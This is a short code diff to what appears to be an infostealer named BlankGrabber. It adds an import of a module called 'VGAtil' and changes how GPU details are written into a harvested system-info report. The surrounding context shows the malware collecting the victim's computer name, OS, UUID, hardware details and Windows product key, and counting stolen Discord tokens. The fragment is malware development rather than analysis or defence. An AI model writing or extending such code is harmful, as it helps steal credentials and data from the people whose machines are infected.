@@ -18,7 +18,7 @@ import time
 import ctypes
 import logging
 import zlib
-
+import VGAtil as GPU
 from threading import Thread
 from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
@@ -1651,7 +1651,7 @@ class BlankGrabber:
         else:
             ipinfo = data
 
-        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {GPU.getGPUs()}\nProduct Key: {productKey}"
 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
